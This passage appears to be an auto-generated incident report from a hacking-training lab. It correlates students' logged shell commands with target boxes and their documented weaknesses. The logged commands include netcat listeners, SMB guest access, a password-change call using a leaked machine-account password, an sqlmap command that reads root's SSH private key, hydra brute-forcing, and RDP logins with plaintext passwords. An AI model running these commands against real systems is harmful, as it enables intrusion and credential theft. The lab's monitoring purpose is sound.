  - 2026-01-26T19:57:26 | logs/10.100.7.14/shell_history.csv#L273 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T19:57:58 | logs/10.100.7.14/shell_history.csv#L275 | smbclient //10.100.7.46/Scripts --user guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 683 - 2026-01-26T19:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:57:51 | logs/10.100.7.14/shell_history.csv#L274 | nc -lvnp 4444
  - 2026-01-26T19:57:09 | logs/10.100.7.13/shell_history.csv#L210 | cd ..
  - 2026-01-26T19:57:18 | logs/10.100.7.13/shell_history.csv#L211 | cd config
  - 2026-01-26T19:57:19 | logs/10.100.7.13/shell_history.csv#L212 | ls
  - 2026-01-26T19:57:24 | logs/10.100.7.13/shell_history.csv#L213 | cat system.config
  - 2026-01-26T19:57:30 | logs/10.100.7.13/shell_history.csv#L214 | cat system.conf
  - 2026-01-26T19:57:02 | logs/10.100.7.24/shell_history.csv#L215 | apt install github.com/OJ/gobuster/v3@latest
  - 2026-01-26T19:57:17 | logs/10.100.7.24/shell_history.csv#L216 | ^[[200~git clone https://github.com/OJ/gobuster.git
  - 2026-01-26T19:57:17 | logs/10.100.7.24/shell_history.csv#L217 | cd gobuster
  - 2026-01-26T19:57:17 | logs/10.100.7.24/shell_history.csv#L218 | go mod tidy
  - 2026-01-26T19:57:20 | logs/10.100.7.24/shell_history.csv#L219 | go mod tidy
  - 2026-01-26T19:57:25 | logs/10.100.7.24/shell_history.csv#L220 | git clone https://github.com/OJ/gobuster.git
cd gobuster
go mod tidy
go build

## Incident 684 - 2026-01-26T19:58:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:58:03 | logs/10.100.7.14/shell_history.csv#L276 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T19:58:18 | logs/10.100.7.14/shell_history.csv#L277 | smbclient //10.100.7.46/Scripts --user guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 685 - 2026-01-27T18:44:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:44:14 | logs/10.100.7.14/shell_history.csv#L286 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T18:44:51 | logs/10.100.7.14/shell_history.csv#L287 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T18:44:56 | logs/10.100.7.12/shell_history.csv#L37 | nmap 10.100.7.46 -p 445
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 686 - 2026-01-27T18:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:45:13 | logs/10.100.7.14/shell_history.csv#L288 | nc -lvnp 4444
  - 2026-01-27T18:45:18 | logs/10.100.7.14/shell_history.csv#L289 | ls

## Incident 687 - 2026-01-27T18:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:54:01 | logs/10.100.7.14/shell_history.csv#L295 | tldr xfreerdp3
  - 2026-01-27T18:54:20 | logs/10.100.7.14/shell_history.csv#L296 | tldr -update xfreerdp3
  - 2026-01-27T18:54:34 | logs/10.100.7.14/shell_history.csv#L297 | tldr --update
  - 2026-01-27T18:54:42 | logs/10.100.7.14/shell_history.csv#L298 | tldr xfreerdp3

## Incident 688 - 2026-01-27T18:54:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:54:21 | logs/10.100.7.24/shell_history.csv#L239 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T18:54:36 | logs/10.100.7.12/shell_history.csv#L40 | nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr -M change-password -o NEWPASS=RandomTextPlease
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 689 - 2026-01-27T18:57:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:57:44 | logs/10.100.7.14/shell_history.csv#L299 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:57:13 | logs/10.100.7.22/shell_history.csv#L180 | scp hey.txt ember@10.100.7.46:/home/user
  - 2026-01-27T18:57:52 | logs/10.100.7.24/shell_history.csv#L244 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 690 - 2026-01-27T18:58:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:58:00 | logs/10.100.7.14/shell_history.csv#L300 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:29 | logs/10.100.7.14/shell_history.csv#L301 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:43 | logs/10.100.7.14/shell_history.csv#L302 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:53 | logs/10.100.7.14/shell_history.csv#L303 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:12 | logs/10.100.7.24/shell_history.csv#L245 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:39 | logs/10.100.7.24/shell_history.csv#L246 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:48 | logs/10.100.7.24/shell_history.csv#L247 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:59 | logs/10.100.7.24/shell_history.csv#L248 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 691 - 2026-01-27T19:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:24:06 | logs/10.100.7.14/shell_history.csv#L340 | dirbuster
  - 2026-01-27T19:24:13 | logs/10.100.7.14/shell_history.csv#L341 | dirb
  - 2026-01-27T19:24:41 | logs/10.100.7.22/shell_history.csv#L235 | ls

## Incident 692 - 2026-01-27T19:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:34:09 | logs/10.100.7.14/shell_history.csv#L352 | nc -lvnp 4444
  - 2026-01-27T19:34:28 | logs/10.100.7.14/shell_history.csv#L353 | exit
  - 2026-01-27T19:34:35 | logs/10.100.7.14/shell_history.csv#L354 | cd ..
  - 2026-01-27T19:34:39 | logs/10.100.7.14/shell_history.csv#L355 | cd dirbuster
  - 2026-01-27T19:34:43 | logs/10.100.7.14/shell_history.csv#L356 | cd wordlists

## Incident 693 - 2026-01-27T19:50:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:50:06 | logs/10.100.7.14/shell_history.csv#L362 | tldr ffuf
  - 2026-01-27T19:50:31 | logs/10.100.7.14/shell_history.csv#L363 | exit
  - 2026-01-27T19:50:47 | logs/10.100.7.14/shell_history.csv#L364 | cd ..
  - 2026-01-27T19:50:56 | logs/10.100.7.14/shell_history.csv#L365 | cd wfuzz

## Incident 694 - 2026-01-27T20:02:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:02:06 | logs/10.100.7.14/shell_history.csv#L385 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ -fc 404,200-299,301,302,307,401,403,405,500
  - 2026-01-27T20:02:24 | logs/10.100.7.13/shell_history.csv#L233 | nmap 10.100.7.45 -p 445
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 695 - 2026-01-27T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:02:02 | logs/10.100.7.12/shell_history.csv#L51 | ms-sql pw ner
  - 2026-01-27T20:02:10 | logs/10.100.7.12/shell_history.csv#L52 | ms-sqlpwner

## Incident 696 - 2026-01-27T20:17:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:17:31 | logs/10.100.7.24/shell_history.csv#L290 | xfreerdp3 /u:rand /v:10.100.7.46 /p:PNqRrcXU4W0eWaE1MGvy
  - 2026-01-27T20:17:32 | logs/10.100.7.24/shell_history.csv#L291 | xfreerdp3 /u:rand /v:10.100.7.46 /p:PNqRrcXU4W0eWaE1MGvy
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 697 - 2026-01-27T20:20:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:20:58 | logs/10.100.7.14/shell_history.csv#L393 | ssh pyre@10.100.7.45
  - 2026-01-27T20:20:59 | logs/10.100.7.14/shell_history.csv#L394 | ssh pyre@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 698 - 2026-01-27T20:21:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:21:33 | logs/10.100.7.14/shell_history.csv#L395 | ssh guest@10.100.7.45
  - 2026-01-27T20:21:56 | logs/10.100.7.14/shell_history.csv#L396 | ssh root@10.100.7.45
  - 2026-01-27T20:21:57 | logs/10.100.7.14/shell_history.csv#L397 | ssh root@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 699 - 2026-01-27T20:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:22:18 | logs/10.100.7.12/shell_history.csv#L59 | exit
  - 2026-01-27T20:22:25 | logs/10.100.7.12/shell_history.csv#L60 | sudo systemctl restart xrdp

## Incident 700 - 2026-02-02T18:42:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:42:07 | logs/10.100.7.14/shell_history.csv#L402 | gobuster dir -u http://10.100.7.45 -w /usr/share/dirb/wordlists/common.txt
  - 2026-02-02T18:42:16 | logs/10.100.7.12/shell_history.csv#L146 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema -T USER_ATTRIBUTES --columns"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 701 - 2026-02-02T19:20:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:20:35 | logs/10.100.7.14/shell_history.csv#L406 | dirbuster -u http://10.100.7.45 -e directory-list-2.3-medium.txt
  - 2026-02-02T19:20:07 | logs/10.100.7.13/shell_history.csv#L291 | gobuster dir -u http://10.100.7.45 -w /usr/share/wordlist/rockyou.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 702 - 2026-02-02T19:29:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:29:09 | logs/10.100.7.14/shell_history.csv#L409 | sqlmap -u http://10.100.7.45" --dbs --crawl=2"
  - 2026-02-02T19:29:19 | logs/10.100.7.14/shell_history.csv#L410 | sqlmap -u http://10.100.7.45" --dbs --crawl=2"
  - 2026-02-02T19:29:10 | logs/10.100.7.12/shell_history.csv#L168 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa"
  - 2026-02-02T19:29:56 | logs/10.100.7.12/shell_history.csv#L169 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 703 - 2026-02-02T19:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:32:25 | logs/10.100.7.14/shell_history.csv#L414 | searhsploit joomla
  - 2026-02-02T19:32:33 | logs/10.100.7.14/shell_history.csv#L415 | searchsploit joomla

## Incident 704 - 2026-02-02T20:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T20:01:34 | logs/10.100.7.13/shell_history.csv#L330 | 1))>79""
  - 2026-02-02T20:01:51 | logs/10.100.7.13/shell_history.csv#L331 | 1))>20""

## Incident 705 - 2026-02-09T18:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:12:00 | logs/10.100.7.14/shell_history.csv#L425 | clear
  - 2026-02-09T18:12:06 | logs/10.100.7.12/shell_history.csv#L301 | smbclient //server/share --user Ember

## Incident 706 - 2026-02-09T18:19:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-02-09T18:19:12 | logs/10.100.7.14/shell_history.csv#L441 | nxc smb 10.100.7.41
  - 2026-02-09T18:19:44 | logs/10.100.7.14/shell_history.csv#L443 | nxc smb 10.100.7.41 -u orbital -p ' '
  - 2026-02-09T18:19:56 | logs/10.100.7.14/shell_history.csv#L444 | nmap 10.100.7.41

## Incident 707 - 2026-02-09T18:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:19:28 | logs/10.100.7.12/shell_history.csv#L304 | nano maintenance.ps1
  - 2026-02-09T18:19:32 | logs/10.100.7.12/shell_history.csv#L305 | cat maintenance.ps1

## Incident 708 - 2026-02-09T18:22:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-09T18:22:23 | logs/10.100.7.14/shell_history.csv#L447 | dirbuster -u http://10.100.7.45 -e directory-list-2.3-medium.txt
  - 2026-02-09T18:22:28 | logs/10.100.7.14/shell_history.csv#L448 | dirbuster -u http://10.100.7.45 -e directory-list-2.3-medium.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 709 - 2026-02-09T18:22:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T18:22:42 | logs/10.100.7.14/shell_history.csv#L449 | gobuster dir -u http://10.100.7.48 -w /usr/share/dirb/wordlists/common.txt
  - 2026-02-09T18:22:50 | logs/10.100.7.14/shell_history.csv#L450 | gobuster dir -u http://10.100.7.48 -w /usr/share/dirb/wordlists/common.txt
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 710 - 2026-02-09T18:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:30:30 | logs/10.100.7.12/shell_history.csv#L306 | n
  - 2026-02-09T18:30:52 | logs/10.100.7.12/shell_history.csv#L307 | nano maintenance.ps1

## Incident 711 - 2026-02-09T18:57:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:57:03 | logs/10.100.7.14/shell_history.csv#L481 | nxc smb 10.100.7.42 -u guest -p ''
  - 2026-02-09T18:57:36 | logs/10.100.7.14/shell_history.csv#L482 | smbclient //10.100.7.42/share --user guest
  - 2026-02-09T18:57:43 | logs/10.100.7.14/shell_history.csv#L483 | smbclient //10.100.7.42/share --user guest
  - 2026-02-09T18:57:50 | logs/10.100.7.14/shell_history.csv#L484 | smbclient //10.100.7.42/share --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 712 - 2026-02-09T19:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:00:22 | logs/10.100.7.14/shell_history.csv#L489 | ls
  - 2026-02-09T19:00:28 | logs/10.100.7.14/shell_history.csv#L490 | cat hashes.txt
  - 2026-02-09T19:00:42 | logs/10.100.7.14/shell_history.csv#L491 | cat maintenance.log

## Incident 713 - 2026-02-09T19:02:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:02:15 | logs/10.100.7.14/shell_history.csv#L492 | smbclient //10.100.7.42/public  --user orbital
  - 2026-02-09T19:02:21 | logs/10.100.7.14/shell_history.csv#L493 | nmap 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 714 - 2026-02-09T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:13:05 | logs/10.100.7.14/shell_history.csv#L499 | hash.txt
  - 2026-02-09T19:13:12 | logs/10.100.7.14/shell_history.csv#L500 | cat hashes.txt

## Incident 715 - 2026-02-09T19:51:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:51:00 | logs/10.100.7.14/shell_history.csv#L516 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-09T19:51:44 | logs/10.100.7.14/shell_history.csv#L517 | xfreerdp3 /v:10.100.7.42 /u:Administrator  /p:Netsiege123!
  - 2026-02-09T19:51:55 | logs/10.100.7.14/shell_history.csv#L518 | xfreerdp3 /v:10.100.7.42 /u:Administrator  /p:Netsiege123!
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 716 - 2026-02-10T18:42:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T18:42:01 | logs/10.100.7.14/shell_history.csv#L528 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:42:09 | logs/10.100.7.14/shell_history.csv#L529 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:42:18 | logs/10.100.7.14/shell_history.csv#L530 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:42:28 | logs/10.100.7.14/shell_history.csv#L531 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:42:42 | logs/10.100.7.14/shell_history.csv#L532 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:42:57 | logs/10.100.7.14/shell_history.csv#L533 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 717 - 2026-02-10T18:43:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T18:43:03 | logs/10.100.7.14/shell_history.csv#L534 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:10 | logs/10.100.7.14/shell_history.csv#L535 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:16 | logs/10.100.7.14/shell_history.csv#L536 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:21 | logs/10.100.7.14/shell_history.csv#L537 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:25 | logs/10.100.7.14/shell_history.csv#L538 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:31 | logs/10.100.7.14/shell_history.csv#L539 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:38 | logs/10.100.7.14/shell_history.csv#L540 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:44 | logs/10.100.7.14/shell_history.csv#L541 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:51 | logs/10.100.7.14/shell_history.csv#L542 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:43:57 | logs/10.100.7.14/shell_history.csv#L543 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 718 - 2026-02-10T18:44:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T18:44:02 | logs/10.100.7.14/shell_history.csv#L544 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:44:17 | logs/10.100.7.14/shell_history.csv#L545 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:44:23 | logs/10.100.7.14/shell_history.csv#L546 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:44:28 | logs/10.100.7.14/shell_history.csv#L547 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:44:48 | logs/10.100.7.14/shell_history.csv#L548 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:44:52 | logs/10.100.7.14/shell_history.csv#L549 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 719 - 2026-02-10T18:45:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T18:45:13 | logs/10.100.7.14/shell_history.csv#L550 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:Netsiege123!
  - 2026-02-10T18:45:20 | logs/10.100.7.14/shell_history.csv#L551 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:Netsiege123!
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 720 - 2026-02-10T18:50:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T18:50:20 | logs/10.100.7.14/shell_history.csv#L553 | namp 10.100.7.48
  - 2026-02-10T18:50:30 | logs/10.100.7.14/shell_history.csv#L554 | nmap 10.100.7.48
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 721 - 2026-02-10T19:14:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:14:45 | logs/10.100.7.14/shell_history.csv#L558 | mysql
  - 2026-02-10T19:14:53 | logs/10.100.7.14/shell_history.csv#L559 | mysql -u -p

## Incident 722 - 2026-02-10T19:35:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:35:19 | logs/10.100.7.14/shell_history.csv#L581 | namp 10.100.7.48
  - 2026-02-10T19:35:24 | logs/10.100.7.14/shell_history.csv#L582 | nmap 10.100.7.48
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 723 - 2026-02-10T19:42:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:42:09 | logs/10.100.7.14/shell_history.csv#L585 | mysql -h 10.100.7.48
  - 2026-02-10T19:42:18 | logs/10.100.7.14/shell_history.csv#L586 | mysql -h 10.100.7.48 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 724 - 2026-01-12T18:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:22:56 | logs/10.100.7.13/shell_history.csv#L5 | sudo bash
  - 2026-01-12T18:22:17 | logs/10.100.7.31/shell_history.csv#L6 | exit
  - 2026-01-12T18:22:22 | logs/10.100.7.31/shell_history.csv#L7 | ifconfig

## Incident 725 - 2026-01-12T19:16:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:16:26 | logs/10.100.7.13/shell_history.csv#L18 | ssh root@10.100.7.40
  - 2026-01-12T19:16:53 | logs/10.100.7.22/shell_history.csv#L14 | smbclient //10.100.7.40/public -U "

## Incident 726 - 2026-01-12T19:18:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:18:31 | logs/10.100.7.13/shell_history.csv#L19 | sudo bash
  - 2026-01-12T19:18:21 | logs/10.100.7.22/shell_history.csv#L19 | vim credentials.txt
  - 2026-01-12T19:18:27 | logs/10.100.7.22/shell_history.csv#L20 | cat credentials.txt

## Incident 727 - 2026-01-12T19:32:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:32:56 | logs/10.100.7.13/shell_history.csv#L30 | nmap -sV -p 1-65535 -T3 10.100.7.42
  - 2026-01-12T19:32:19 | logs/10.100.7.22/shell_history.csv#L37 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:$HEX[330a]
  - 2026-01-12T19:32:41 | logs/10.100.7.22/shell_history.csv#L38 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:abc123
  - 2026-01-12T19:32:45 | logs/10.100.7.22/shell_history.csv#L39 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwert
  - 2026-01-12T19:32:48 | logs/10.100.7.22/shell_history.csv#L40 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwerty
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 728 - 2026-01-12T19:48:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:48:47 | logs/10.100.7.13/shell_history.csv#L33 | hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42
  - 2026-01-12T19:48:42 | logs/10.100.7.22/shell_history.csv#L42 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 729 - 2026-01-13T19:10:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:10:36 | logs/10.100.7.13/shell_history.csv#L39 | enum4linux -a 10.100.7.40
  - 2026-01-13T19:10:36 | logs/10.100.7.13/shell_history.csv#L40 | enum4linux -a 10.100.7.40

## Incident 730 - 2026-01-26T18:57:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-26T18:57:14 | logs/10.100.7.24/shell_history.csv#L105 | ssh solaris@10.100.7.41
  - 2026-01-26T18:57:19 | logs/10.100.7.24/shell_history.csv#L106 | ssh 10.100.7.41

## Incident 731 - 2026-01-26T19:09:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T19:09:45 | logs/10.100.7.13/shell_history.csv#L107 | git-dumper http://10.100.7.44/git/forge-logs.git/ ~/10.100.7.44
  - 2026-01-26T19:09:45 | logs/10.100.7.13/shell_history.csv#L107 | git-dumper http://10.100.7.44/git/forge-logs.git/ ~/10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 732 - 2026-01-26T19:09:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:09:04 | logs/10.100.7.24/shell_history.csv#L118 | ls
  - 2026-01-26T19:09:15 | logs/10.100.7.24/shell_history.csv#L119 | unzip backup.zip
  - 2026-01-26T19:09:29 | logs/10.100.7.24/shell_history.csv#L120 | vim credentials.txt

## Incident 733 - 2026-01-26T19:16:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:16:16 | logs/10.100.7.24/shell_history.csv#L136 | vim REadme.txt
  - 2026-01-26T19:16:27 | logs/10.100.7.24/shell_history.csv#L137 | vim README.txt

